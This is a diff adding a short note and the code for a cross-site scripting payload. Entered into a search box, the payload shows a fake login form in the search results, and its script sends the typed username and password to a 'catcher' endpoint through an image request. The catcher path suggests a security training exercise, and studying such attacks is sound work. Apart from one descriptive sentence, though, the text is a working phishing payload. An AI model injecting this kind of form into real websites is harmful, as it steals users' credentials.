@@ -1,0 +1,21 @@
+The following is the code I created. Entering the following code in the search input box and click search button will generate fake authentication form in the search result field. The form asks user for their account name and password.
+
+<div>
+<b>For security reasons, please login to view the search result.<b>
+<div>
+<div>
+ 	<label for="phishingEmail1">Username</label>
+    <input type="text" id="phishingEmail1" placeholder="Username" name='username'>
+</div>
+<div>
+	<label for="phishingPassword">Password</label>
+	<input type="password" id="phishingPassword" placeholder="Password" name='password'>
+</div>
+<button id="phishingButton" onclick="phishingFunc()">Sign in</button>
+
+<script>
+function phishingFunc() {
+	var myImage = new Image();
+	myImage.src = 'catcher?PROPERTY=yes&user=' + document.getElementById("phishingEmail1").value + '&password=' + document.getElementById("phishingPassword").value;
+}
+</script>
